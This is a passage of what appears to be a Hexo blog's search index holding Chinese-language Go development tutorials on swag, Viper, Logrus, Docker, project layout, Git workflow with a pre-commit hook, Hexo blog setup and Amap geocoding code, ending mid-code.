"main.go")--dir value, -d value                  API解析目录 (默认: "./")--exclude value                        解析扫描时排除的目录，多个目录可用逗号分隔（默认：空）--propertyStrategy value, -p value     结构体字段命名规则，三种：snakecase,camelcase,pascalcase (默认: "camelcase")--output value, -o value               文件(swagger.json, swagger.yaml and doc.go)输出目录 (默认: "./docs")--parseVendor                          是否解析vendor目录里的go源文件，默认不--parseDependency                      是否解析依赖目录中的go源文件，默认不--markdownFiles value, --md value      指定API的描述信息所使用的markdown文件所在的目录--generatedTime                        是否输出时间到输出文件docs.go的顶部，默认是--codeExampleFiles value, --cef value  解析包含用于 x-codeSamples 扩展的代码示例文件的文件夹，默认禁用--parseInternal                        解析 internal 包中的go文件，默认禁用--parseDepth value                     依赖解析深度 (默认: 100)--instanceName value                   设置文档实例名 (默认: "swagger")</code></pre><pre class=" language-shell"><code class="language-shell">swag fmt -hNAME:   swag fmt - format swag commentsUSAGE:   swag fmt [command options] [arguments...]OPTIONS:   --dir value, -d value          API解析目录 (默认: "./")   --exclude value                解析扫描时排除的目录，多个目录可用逗号分隔（默认：空）   --generalInfo value, -g value  API通用信息所在的go源文件路径，如果是相对路径则基于API解析目录 (默认: "main.go")   --help, -h                     show help (default: false)</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> swagger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-配置篇 | Go</title>
      <link href="/technique/24.html"/>
      <url>/technique/24.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/spf13/viper">Viper</a>是适用于Go的配置管理工具。它被设计用于在应用程序中工作，并且可以处理多种类型的配置需求和格式。Viper支持:</p><ul><li>设置默认值</li><li>从JSON、TOML、YAML、HCL、envfile和Java properties格式的配置文件读取配置信息</li><li>实时监控和重新读取配置文件（可选）</li><li>从环境变量中读取</li><li>从远程配置系统（etcd或Consul）读取并监控配置变化</li><li>从命令行参数读取配置</li><li>从buffer读取配置</li><li>显式配置值</li></ul><p>Viper会按照如下优先级读取配置:</p><ul><li>显示调用Set设置值</li><li>命令行参数（flag）</li><li>环境变量</li><li>配置文件</li><li>key&#x2F;value存储</li><li>默认值</li></ul><blockquote><p>设置默认值<br>默认值是可选的，但如果没有通过配置文件、环境变量、远程配置或命令行标志（flag）设置值，设置默认值则具有重要性。</p></blockquote><pre><code>viper.SetDefault(&quot;ContentDir&quot;, &quot;content&quot;)viper.SetDefault(&quot;LayoutDir&quot;, &quot;layouts&quot;)viper.SetDefault(&quot;Taxonomies&quot;, map[string]string&#123;&quot;tag&quot;: &quot;tags&quot;, &quot;category&quot;: &quot;categories&quot;&#125;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> develop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-日志篇 | Go</title>
      <link href="/technique/21.html"/>
      <url>/technique/21.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/sirupsen/logrus">Logrus</a> 是 Go 的结构化日志记录库，与标准库中的日志模块完全兼容。</p><blockquote><p><strong>logrus安装</strong></p></blockquote><pre><code>go install github.com/sirupsen/logrus@latest</code></pre><blockquote><p><strong>logrus使用</strong></p></blockquote><p>在使用 logrus 时，鼓励用 <code>log.WithFields(log.Fields&#123;&#125;).Fatal()</code> 这种方式替代 <code>log.Fatalf(&quot;Failed to send event %s to topic %s with key %d&quot;)</code>， 以结构化日志输出。</p><pre><code>log.WithFields(log.Fields&#123;  &quot;event&quot;: event,  &quot;topic&quot;: topic,  &quot;key&quot;: key,&#125;).Fatal(&quot;Failed to send event&quot;)</code></pre><p>若想让重复出现的字段始终附加日志语中，可以将其设置为默认字段，通过创建一个 logrus.Entry来实现</p><pre><code>requestLogger := log.WithFields(log.Fields&#123;&quot;request_id&quot;: request_id, &quot;user_ip&quot;: user_ip&#125;)requestLogger.Info(&quot;something happened on that request&quot;) # will log request_id and user_iprequestLogger.Warn(&quot;something not great happened&quot;)</code></pre><ul><li>日志输出级别</li></ul><p>Logrus日志级别共有7类，警告级别从低到高低依次为：Trace, Debug, Info, Warning, Error, Fatal and Panic</p><pre><code>log.Trace(&quot;Something very low level.&quot;)log.Debug(&quot;Useful debugging information.&quot;)log.Info(&quot;Something noteworthy happened!&quot;)log.Warn(&quot;You should probably take a look at this.&quot;)log.Error(&quot;Something failed but I&#39;m not quitting.&quot;)// Calls os.Exit(1) after logginglog.Fatal(&quot;Bye.&quot;)// Calls panic() after logginglog.Panic(&quot;I&#39;m bailing.&quot;)</code></pre><p>设置日志输出警告级别</p><pre><code>log.SetLevel(log.WarnLevel) </code></pre><ul><li>日志输出格式</li></ul><p>Logrus内置了JSONFormatter 和 TextFormatter，来定义输出的日志格式。实际开发中，也可以自定义输出格式。</p><p>设置内置日志输出格式</p><pre><code>log.SetFormatter(&amp;log.JSONFormatter&#123;    TimestampFormat: &quot;2006-01-02 15:04:05&quot;, &#125;)//Log as JSON instead of the default ASCII formatter.log.SetFormatter(&amp;log.JSONFormatter&#123;&#125;)log.SetFormatter(&amp;log.TextFormatter&#123;    TimestampFormat: &quot;2006-01-02 15:04:05&quot;,     DisableColors: true,    FullTimestamp: true,&#125;)//Log as Text instead of the default ASCII formatter.log.SetFormatter(&amp;log.TextFormatter&#123;&#125;)</code></pre><p>自定义日志格式</p><p>如下所示，可以参考SetFormatter方法中的参数Formatter， 使用该接口自定义日志格式，其包含 Format 方法，方法内有一个struct类型数据 *Entry， Entry.Data 是所有字段集合，Fields 类型为 map[string]interface{}</p><pre><code>// SetFormatter sets the logger formatter.func (logger *Logger) SetFormatter(formatter Formatter) &#123;    logger.mu.Lock()    defer logger.mu.Unlock()    logger.Formatter = formatter&#125;type Formatter interface &#123;    Format(*Entry) ([]byte, error)&#125;type Entry struct &#123;    Logger *Logger    // Contains all the fields set by the user.    Data Fields    // Time at which the log entry was created    Time time.Time    // Level the log entry was logged at: Trace, Debug, Info, Warn, Error, Fatal or Panic    // This field will be set on entry firing and the value will be equal to the one in Logger struct field.    Level Level    // Calling method, with package name    Caller *runtime.Frame    // Message passed to Trace, Debug, Info, Warn, Error, Fatal or Panic    Message string    // When formatter is called in entry.log(), a Buffer may be set to entry    Buffer *bytes.Buffer    // Contains the context set by the user. Useful for hook processing etc.    Context context.Context    // err may contain a field formatting error    err string&#125;</code></pre><p>自定义日志格式例子</p><pre><code>type MyJSONFormatter struct &#123;&#125;log.SetFormatter(new(MyJSONFormatter))func (f *MyJSONFormatter) Format(entry *Entry) ([]byte, error) &#123;  // Note this doesn&#39;t include Time, Level and Message which are available on  // the Entry. Consult `godoc` on information about those fields or read the  // source of the official loggers.  serialized, err := json.Marshal(entry.Data)    if err != nil &#123;      return nil, fmt.Errorf(&quot;Failed to marshal fields to JSON, %w&quot;, err)    &#125;  return append(serialized, &#39;\n&#39;), nil&#125;</code></pre><ul><li>日志输出方式</li></ul><p>设置日志输出方式</p><pre><code>// Output to stdout instead of the default stderrlog.SetOutput(os.Stdout)// Can be any io.Writer, see below for File examplelogfile, err := os.OpenFile(&quot;./logrus.log&quot;, os.O_CREATE|os.O_WRONLY|os.O_APPEND,0644)if err == nil &#123;    log.SetOutput(logfile) &#125; else &#123;    log.Info(&quot;Failed to log to file, using default stderr&quot;)&#125;</code></pre><ul><li>日志输出内容</li></ul><p>如果希望将调用方法添加为字段，可以设置</p><pre><code>log.SetReportCaller(true)</code></pre><p>日志输出</p><pre><code>&#123;&quot;animal&quot;:&quot;penguin&quot;,&quot;level&quot;:&quot;fatal&quot;,&quot;method&quot;:&quot;github.com/sirupsen/arcticcreatures.migrate&quot;,&quot;msg&quot;:&quot;a penguin swims by&quot;,&quot;time&quot;:&quot;2014-03-10 19:57:38.562543129 -0400 EDT&quot;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> logs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-docker篇</title>
      <link href="/technique/20.html"/>
      <url>/technique/20.html</url>
      
        <content type="html"><![CDATA[<p>应用程序通过隔离实现在运行时相互独立互不干扰，目前实现隔离的方式包括：虚拟机、容器。<br>与虚拟机通过操作系统实现隔离不同，容器技术只隔离应用程序的运行时环境，而容器之间可以共享同一个操作系统。在这里，运行时环境指的是程序运行所需的各种库和配置。</p><p>Docker 是一个开源的容器化平台，用于构建、部署和运行应用程序。它可以让开发者打包应用以及依赖项到一个轻量级、可移植的容器中，该容器可以在任何支持Docker的环境中运行。（<a href="https://docs.docker.com/">docker官方文档地址</a>）</p><p>Docker 使用的架构是 C&#x2F;S 架构，包括 Docker 客户端和 Docker 服务器。Docker 客户端通过 RESTful API 与 Docker 服务器通信，Docker 服务器负责管理 Docker 镜像、容器等资源。</p><p>Docker解决了以下问题：</p><ul><li>环境不一致</li><li>隔离性</li><li>弹性伸缩</li></ul><h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>官方地址：<a href="https://docs.docker.com/get-docker/">docs.docker.com&#x2F;get-docker</a> </p><p>检查安装版本：<code>docker --version</code></p><h3 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h3><ul><li>Dokerfile<blockquote><p>Docker builds images by reading the instructions from a Dockerfile. A Dockerfile is a text file containing instructions for building your source code.<br>用来构建 Docker 镜像的文本文件，包含了一系列指令，用于描述如何构建镜像。通过 Dockerfile，用户可以定义镜像的基础操作系统、安装依赖、配置环境变量等步骤，以及容器启动时需要执行的命令</p></blockquote></li><li>Docker Images<blockquote><p>Docker images consist of layers. Each layer is the result of a build instruction in the Dockerfile. Layers are stacked sequentially, and each one is a delta representing the changes applied to the previous layer.<br>是一个只读的模板，包含了运行容器所需的文件系统、应用程序和配置等信息。可以通过 Dockerfile 来构建 Docker 镜像，也可以从 Docker 仓库中拉取现有的镜像。</p></blockquote></li><li>Docker Container<blockquote><p>A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another.<br>是 Docker 镜像的可运行实例，类似于一个轻量级、独立的虚拟机。每个容器都运行在独立的环境中，包含自己的文件系统、进程空间等，但与宿主机共享内核。</p></blockquote></li><li>Docker Compose<blockquote><p>Docker Compose is a tool for defining and running multi-container applications. It is the key to unlocking a streamlined and efficient development and deployment experience.<br>用于定义和运行多容器 Docker 应用的工具。通过一个单独的 YAML 文件（通常命名为 docker-compose.yml），用户可以定义多个容器的配置，包括镜像、环境变量、网络设置等，然后使用一个命令就可以启动、停止或删除整个应用。</p></blockquote></li><li>Docker Registry<blockquote><p>Docker registry stores Docker images. Docker Hub is a public registry that anyone can use, and Docker is configured to look for images on Docker Hub by default. You can also run your own private registry.<br>用于存储 Docker 镜像，可以分为公共仓库（如 Docker Hub）和私有仓库。用户可以将自己构建的 Docker 镜像推送到仓库中，也可以从仓库中拉取他人分享的镜像。</p></blockquote></li></ul><p>docker启动&#x2F;停止命令：</p><pre><code>systemctl stop dockersystemctl start dockersystemctl restart docker</code></pre><p>docker状态查看：<code>systemctl status docker</code><br>docker信息查看：<code>docker info</code><br>docker镜像查看：<code>docker images</code><br>docker镜像删除：<code>docker rmi 镜像标识</code><br>docker容器查看：<code>docker ps -a</code></p><p>Dockerfile编写</p><pre><code>FROM：指定基础镜像名称和版本，将打包的项目在该基础镜像上运行（每个 Dockerfile 中必须添加，并且必须是第一条指令）LABEL：为镜像添加元数据，可以用于标识镜像的作者、版本、描述等信息（可忽略）ENV：设置环境变量，可以在容器内部使用WORKDIR：设置工作目录，用于指定容器内部的工作目录，后续的命令都将在该目录下执行COPY：从本地复制文件至创建的镜像文件RUN: 对创建的镜像使用的命令CMD: 容器被创建启动时执行的命令</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-目录结构 | Go</title>
      <link href="/technique/19.html"/>
      <url>/technique/19.html</url>
      
        <content type="html"><![CDATA[<p>如果仅是一个简单的功能，项目的布局并不需要精心设计。而在项目逐渐扩大的过程中，保持良好的代码结构非常重要。如果不注意，最终可能会得到一个混乱的代码，其中包含大量隐藏的依赖项和全局状态。当项目有更多的参与者时，也需要更多的组织结构。因此，了解如何有效地管理包和库、组织项目的布局是非常重要的。</p><p>项目的目录结构没有统一的模板，不同项目的目录结构，要依据项目类型、大小及灵活程度做调整，但也遵循一定的规范。</p><blockquote><p><strong>命名要求和规范</strong></p></blockquote><ol><li><p>命名清晰：目录命名要清晰、简洁，不要太长，也不要太短。目录名要能清晰地表达出该目录实现的功能，并且目录名最好用单数（特殊情况，如 &#x2F;docs、&#x2F;examples）。一方面是因为单数足以说明这个目录的功能，另一方面可以统规范，避免单复混用的情况。</p></li><li><p>功能明确：一个目录所要实现的功能应该是明确的、并且在整个项目目录中具有很高的辨识度。当需要新增一个功能时，我们能够非常清楚地知道把这个功能放在哪个目录下。</p></li><li><p>全面性：目录结构应该尽可能全面地包含研发过程中需要的功能，例如文档、脚本、源码管理、API 实现、工具、第三方包、测试、编译产物等</p></li><li><p>可观测性：项目规模一定是从小到大的，所以一个好的目录结构应该能够在项目变大时，仍然保持之前的目录结构。</p></li><li><p>可扩展性：每个日录下存放了同类的功能，在项目变大时，这些目录应该可以存放更多同类功能。</p></li></ol><blockquote><p><strong>MVC模式</strong></p></blockquote><p>MVC（Model View Controller）是软件工程中的一种软件架构模式，该模式将用户界面和业务逻辑分离，以使代码可扩展性、可复用性、可维护性、灵活性加强。它把软件系统分为三个基本部分：模型（model）、视图（view）、控制器（controller）。</p><p>View层是界面，Model层是业务逻辑，Controller层用来调度View层和Model层，将用户界面和业务逻辑合理的组织在一起，起粘合剂的效果。</p><p>Golang项目目录结构也有一些MVC的影子。</p><blockquote><p><strong>示例目录结构</strong></p></blockquote><ul><li><p><a href="https://github.com/golang-standards/project-layout">golang-standards&#x2F;project-layout</a></p><pre><code>├── api  ├── assets├── build├── cmd├── configs├── deployments├── docs├── examples├── githooks├── go.mod├── init├── internal├── LICENSE.md├── Makefile├── pkg├── README_zh-CN.md├── scripts├── test├── third_party├── tools├── vendor├── web└── website  </code></pre></li><li><p><a href="https://github.com/flipped-aurora/gin-vue-admin">gin-vue-admin</a></p><pre><code>├── server    ├── api             (api层)    │   └── v1          (v1版本接口)    ├── config          (配置包)    ├── core            (核心文件)    ├── docs            (swagger文档目录)    ├── global          (全局对象)                        ├── initialize      (初始化)                            │   └── internal    (初始化内部函数)                                ├── middleware      (中间件层)                            ├── model           (模型层)                        │   ├── request     (入参结构体)                            │   └── response    (出参结构体)                                ├── packfile        (静态文件打包)                            ├── resource        (静态资源文件夹)                            │   ├── excel       (excel导入导出默认路径)                            │   ├── page        (表单生成器)                            │   └── template    (模板)                                ├── router          (路由层)                        ├── service         (service层)                        ├── source          (source层)                        └── utils           (工具包)                            ├── timer       (定时器接口封装)                                └── upload      (oss接口封装)</code></pre></li><li><p>示例</p><pre><code>├── conf        (配置初始化)├── cache       (缓存处理)├── controller  (请求入口)├── biz         (业务逻辑)├── errorcode   (错误处理)├── format      (格式化数据处理)├── logs        (日志)├── middleware  (中间件)├── model       (数据关系映射)├── request     (参数处理)├── router      (路由)├── service     (服务底层处理/远程调用)├── utils        (工具类)</code></pre></li><li><p>示例</p><pre><code>├── app                (应用)    ├── api            (控制层)    ├── consts         (常量定义)    ├── dao            (数据层)        ├── internal   (模型生成)    ├── middleware     (中间件)    ├── model          (处理数据类型定义)    ├── request        (请求返回定义)    ├── service        (服务层)├── conf               (配置项)├── core               (核心)├── docs               (文档生成)├── logs               (日志)├── router             (路由)├── utils              (工具)</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> develop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-Git操作篇</title>
      <link href="/technique/18.html"/>
      <url>/technique/18.html</url>
      
        <content type="html"><![CDATA[<h3 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h3><ul><li>Git书籍<a href="https://git-scm.com/book/en/v2">Pro Git book</a></li><li>学习Git操作的在线游戏小网站 <a href="https://learngitbranching.js.org/?locale=zh_CN">Learn Git Branching</a></li><li>工作中常用的Git操作<a href="https://juejin.cn/post/6844903586120335367?searchId=202307211637490692F188E23F90BD2F63">Git常用操作总结</a></li></ul><h3 id="Git流程规范"><a href="#Git流程规范" class="headerlink" title="Git流程规范"></a>Git流程规范</h3><p>  业务层服务后端使用Git进行版本控制需要遵循一定的工作流程，以下是一种常用的流程。</p><blockquote><p><strong>分支命名方法</strong></p></blockquote><ol><li>生产环境使用 master 分支，测试环境使用 dev 分支</li><li>其它开发分支命名规则如下：</li></ol><ul><li><p>bug 修复分支</p><p>bugfix-项目名称-描述 如：bugfix-feature-description</p></li><li><p>功能开发分支 </p><p>feat-项目名称-描述 如：feat-feature-description</p></li></ul><p>  长期分支存在两个：用于生产环境的 master 分支，用于测试环境的 dev 分支</p><p>  临时分支有三类：用于新增功能的 feat- 分支， 用于 bug 修复的 bugfix- 分支，用于发布前的 release-* 分支</p><blockquote><p><strong>新功能开发</strong></p></blockquote><ol><li>从线上主干拉取最新的稳定代码</li></ol><pre><code>拉取最新的稳定主干分支git checkout mastergit pull origin master创建对应功能分支git checkout -b feat-feature-description完成代码开发git push origin feat-feature-description</code></pre><ol><li>合并功能分支至测试环境 dev 分支</li></ol><pre><code>git checkout devgit merge feat-feature-descriptiongit push origin dev</code></pre><ol start="2"><li>测试通过，创建发布分支</li></ol><pre><code>git checkout mastergit checkout -b release-*git merge feat-feature-descriptiongit merge feat-*...git checkout mastergit merge release-*git push origin mastergit checkout dev</code></pre><ol start="3"><li>删除相应的临时分支</li></ol><pre><code>git push origin :feat-feature-descriptiongit push origin :release-*...git branch -d feat-feature-descriptiongit branch -d release-*</code></pre><blockquote><p><strong>缺陷修复</strong></p></blockquote><p>   在第二步时创建对应的 bugfix-* 分支，其它步骤同功能开发。</p><pre><code>git checkout mastergit pull origin mastergit checkout -b bugfix-*...git checkout devgit merge bugfix-*git push origin dev...git checkout mastergit merge bugfix-*git push origin master...</code></pre><blockquote><p><strong>代码检查</strong></p></blockquote><p>   增加 pre-commit 钩子进行提交前代码检查<br>   对 imports 进行更新，添加需引入的依赖，去除不使用的依赖<br>   对代码风格进行检查<br>   对代码进行格工化<br>   对代码语法进行静态检查<br>   运行单元测试</p><ul><li>安装依赖的工具<pre><code>go get golang.org/x/tools/cmd/goimportsgo install golang.org/x/tools/cmd/goimportsgo get golang.org/x/lint/golintgo install golang.org/x/lint/golint</code></pre></li><li>pre-commit文件内容<pre><code>#!/bin/sh STAGED_GO_FILES=$(git diff --cached --name-only --diff-filter=ACM | grep &quot;.go$&quot;) if [[ &quot;$STAGED_GO_FILES&quot; = &quot;&quot; ]]; then    exit 0fi PASS=true for FILE in $STAGED_GO_FILESdo    # 跳过vendor目录下的文件    if [[ $FILE == &quot;vendor&quot;* ]];then        continue    fi     # goimports 检查并调整导入语句    goimports -w $FILE    if [[ $? != 0 ]]; then        PASS=false    fi     # golint 检查代码风格,给出提示    golint &quot;-set_exit_status&quot; $FILE    if [[ $? == 1 ]]; then        PASS=false    fi     # go tool vet 检查代码中的静态错误    # go vet $FILE    # if [[ $? != 0 ]]; then    #     PASS=false    # fi     # 如果当前文件没有被格式化，就格式化它    UNFORMATTED=$(gofmt -l $FILE)    if [[ &quot;$UNFORMATTED&quot; != &quot;&quot; ]];then        gofmt -w $PWD/$UNFORMATTED        if [[ $? != 0 ]]; then            PASS=false        fi    fi     # 上述 goimports, gofmt可能会对文件作出改动，    # 所以此处将更改提交至暂存区    git add $FILE done if ! $PASS; then    printf &quot;\033[31mCOMMIT FAILED \033[0m\n&quot;    exit 1else    printf &quot;\033[32mCOMMIT SUCCEEDED \033[0m\n&quot;fi exit 0</code></pre></li></ul><blockquote><p><strong>需要注意</strong></p></blockquote><ul><li>严禁直接在 master 分支提交代码</li><li>严禁直接在 dev 分支提交代码</li><li>在 dev 分支因调试进行的代码修改必须切回对应的功能或缺陷修复分支后进行提交</li><li>创建发布分支是为了避免有些开发好的功能因特殊原因取消上到正式环境的情况，避免手工剔除代码，如果功能确认上到正式环境，可省略这一步</li><li>临时分支在开发完成上到正式环境 稳定后（最多一周）必须删除，防止分支堆积造成混淆</li><li>不要把调试代码签入版本控制</li><li>git log 需要明确写出更改的部分</li><li>合并冲突问题本地解决</li></ul>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+github+material博客搭建</title>
      <link href="/technique/17.html"/>
      <url>/technique/17.html</url>
      
        <content type="html"><![CDATA[<p>此前是使用typecho模板+阿里云服务器搭建的博客，由于某次忘记续费导致网站关闭，临时联系客服续费备份了网站和数据库文件。</p><p>考虑到后续的一些开销，于是转战github网站免费托管。而typecho是动态渲染的，不适用github的托管服务。因此网站框架也改用为hexo。</p><blockquote><p>  hexo 是一个静态博客生成工具，具备编译 Markdown、拼接主题模板、生成 HTML、上传 Git 或 FTP 等基本功能。</p></blockquote><p>建站是主要参考了hexo官方文档<a href="https://hexo.io/zh-cn/docs/index.html">参考链接</a>和U2647’s blog（<a href="https://zdran.com/20180326.html">参考链接</a>）</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li><p>Nodejs <a href="https://nodejs.org/zh-cn">下载地址</a></p><p>Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本</p><p>检查是否安装成功</p><pre><code>PS C:\Windows\System32&gt; node -vv16.14.2PS C:\Windows\System32&gt; npm -v8.5.0</code></pre></li><li><p>Git <a href="https://git-scm.com/downloads">下载地址</a><br>检查是否安装成功</p><pre><code>PS C:\Windows\System32&gt; git --versiongit version 2.35.1.windows.</code></pre></li></ul><h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><h3 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h3><p>建议首先阅读hexo官方文档</p><ul><li><p>安装hexo</p><p>将hexo的功能封装为命令，提供给用户通过 hexo server &#x2F; hexo deploy 等命令调用的模块，就是 hexo-cli（hexo-Command Line Interface）。</p><p>终端输入：</p><p><code>npm install -g hexo-cli</code></p></li><li><p>博客初始化</p><p>新建一个用于存放hexo博客的空文件夹，进入该文件夹，终端输入：</p><p><code>hexo init</code></p><p>该命令执行相当于</p><ul><li>Git clone hexo-starter 和 hexo-theme-landscape 主题到当前目录（指定文件夹时，则到指定目录）。</li><li>下载依赖。</li></ul><p>此时，博客文件夹的文件结构如下：</p><pre><code>. ├── _config.yml           网站的配置信息├── package.json          应用程序的信息├── scaffolds             文章模版├── source                用户资源|     └── _posts          *├── themes                主题     ├── node_modules   ├── .github├── .gitignore├── _config.landscape.yml  └──  yarn.lock    </code></pre><blockquote><p>*除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 &#x2F; 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p></blockquote><p>接着，生成静态文件：</p><p><code>hexo generate</code>  缩写：<code>hexo g</code></p><p>然后，启动服务器（默认情况下，访问网址为： <a href="http://localhost:4000/">http://localhost:4000/</a> ）：</p><p><code>hexo server</code>    缩写：<code>hexo s</code> </p><p>访问网站查看博客部署情况，页面显示如下，则成功：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/20230420161436.png" alt="hexo"></p></li></ul><h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>hexo安装时默认使用landscape主题，我使用的是material主题，虽然主题最近的更新时间都是好几年前，但是还是能用用的！</p><ul><li><p>下载material主题</p><p>在博客目录，终端输入：</p><pre><code>cd themesgit clone git@github.com:iblh/hexo-theme-material.git material</code></pre></li><li><p>修改网站配置</p><p>修改博客主目录下的网站配置文件_config.yml中的theme值，将值修改为安装的主题文件夹名称。（网站配置文件每项的含义可以仔细阅读注释或者查看官方文档）</p><p><code>theme: material</code></p></li><li><p>主题配置</p><p>首先将theme&#x2F;material 目录下_config.template.yml 重命名为 _config.yml</p><p>阅读material主题的文档<a href="https://neko-dev.github.io/material-theme-docs/#/">链接</a>，自定义主题配置项。</p><p>这里分享常用的配置：</p><ul><li>侧边栏<pre><code># Sidebar Customizesidebar:    dropdown:        Email Me:        link: &quot;mailto: 你的邮箱&quot;        icon: email    homepage:        use: true        icon: home        divider: false    archives:        use: true        icon: inbox        divider: false    categories:        use: true        icon: chrome_reader_mode        divider: true    pages:          标签云:             link: &quot;/tags&quot;            icon: cloud            divider: false        时间轴:            link: &quot;/timeline&quot;            icon: timeline             divider: true        友链:            link: &quot;/links&quot;            icon: links            divider: false        关于:            name: 关于            link: &quot;/about&quot;            icon: person            divider: true    article_num:        use: true        divider: false    footer:        divider: true        theme: false        support: false        feedback: false        material: false</code></pre></li></ul></li></ul><h3 id="提交部署"><a href="#提交部署" class="headerlink" title="提交部署"></a>提交部署</h3><ul><li><p>安装部署插件</p><ul><li><p>git类型<br>终端输入：</p><p><code>npm install hexo-deployer-git --save</code></p><p>对应的网站配置项</p><pre><code>deploy:  type: git  repo: &lt;repository url&gt;   branch: [branch]  message: [message]</code></pre></li></ul></li><li><p>仓库配置</p><p>配置仓库的部署方式、仓库地址和分支名称，这里选择github和coding作为托管。</p><pre><code>deploy:- type: git  repository:     github: git@github.com:xxx.git,main    coding: git@e.coding.net:xxx,master</code></pre></li><li><p>网站部署</p><p>在博客主目录下，终端输入：</p><pre><code>hexo d -g-g, --generate部署之前预先生成静态文件</code></pre><p>执行 <code>hexo deploy</code> 时，Hexo 会将 public 目录中的文件和目录推送至 _config.yml 中指定的远端仓库和分支中，并且完全覆盖该分支下的已有内容</p></li></ul><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><ol><li><p>material主题，主页的分页不显示icon，显示源代码</p><p>修复：在material主题文件夹的layout目录下，在index.ejs中的分页代码新增<code>escape:false</code></p><pre><code> &lt;%- paginator(&#123;   prev_text: __(&#39;&lt;button aria-label=&quot;Last page&quot; class=&quot;mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon&quot;&gt;&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;arrow_back&lt;/i&gt;&lt;/button&gt;&#39;),   next_text: __(&#39;&lt;button aria-label=&quot;Next page&quot; class=&quot;mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon&quot;&gt;&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;arrow_forward&lt;/i&gt;&lt;/button&gt;&#39;),   space: &#39;&#39;,   escape: false, &#125;) %&gt;</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用高德地图API根据地址名称获取经纬度（Go语言）</title>
      <link href="/technique/16.html"/>
      <url>/technique/16.html</url>
      
        <content type="html"><![CDATA[<p>天地图、腾讯地图、高德地图等都提供对外开放的API，这里主要针对高德地图，进行地理编码接口的调用。<br>高德地图web API官方文档<a href="https://lbs.amap.com/api/webservice/summary">链接</a>，根据文档的步骤，构造对应的请求URL<br><code>https://restapi.amap.com/v3/geocode/geo?parameters</code></p><blockquote><p>背景</p></blockquote><p>地理编码表：共五级行政区域，分别为省&#x2F;直辖市、区&#x2F;县、街道&#x2F;镇、社区&#x2F;乡村</p><p>地理编码表中各地理编码和高德地图提供的地理编码不完全相同</p><blockquote><p>方法</p></blockquote><p>按级别分批获取地理编码表中的地址名称，根据pcode构造结构化地址信息，作为参数address的值，默认返回格式为json，判断返回的地理信息匹配级别是否对应，将匹配正确的经纬度信息插入数据库。</p><p>匹配级别和五级行政区域名称相差，但是返回数据合理的，可以将该匹配级别加入ignore list</p><p>Go语言代码如下：</p><pre><code>package mainimport (    &quot;encoding/json&quot;    &quot;flag&quot;    &quot;fmt&quot;    &quot;io/ioutil&quot;    &quot;net/http&quot;    &quot;strconv&quot;    &quot;strings&quot;    &quot;gorm.io/driver/mysql&quot;    &quot;gorm.io/gorm&quot;)// Area 地理编码表结构type Area struct &#123;    ID            int     `json:&quot;id&quot; gorm:&quot;column:id; PRIMARY_KEY; AUTO_INCREMENT&quot;`    Code          int64   `json:&quot;code&quot; gorm:&quot;column:code;type:bigint(12)&quot;`    Name          string  `json:&quot;name&quot; gorm:&quot;column:name; type:varchar(50); default:&#39;&#39;&quot;`    Pcode         int64   `json:&quot;pcode&quot; gorm:&quot;column:pcode;type:bigint(12)&quot;`    ProvinceCode  int64   `json:&quot;province_code&quot; gorm:&quot;column:province_code;type:bigint(12)&quot;`    CityCode      int64   `json:&quot;city_code&quot; gorm:&quot;column:city_code;type:bigint(12)&quot;`    AreaCode      int64   `json:&quot;area_code&quot; gorm:&quot;column:area_code;type:bigint(12)&quot;`    StreetCode    int64   `json:&quot;street_code&quot; gorm:&quot;column:street_code;type:bigint(12)&quot;`    CommitteeCode int64   `json:&quot;committee_code&quot; gorm:&quot;column:committee_code;type:bigint(12)&quot;`    CommitteeType int64   `json:&quot;committee_type&quot; gorm:&quot;column:committee_type;type:bigint(12)&quot;`    Sort          int     `json:&quot;sort&quot; gorm:&quot;column:sort; type:int(2); default:1&quot;`    Level         int     `json:&quot;level&quot; gorm:&quot;column:level; type:int(2); 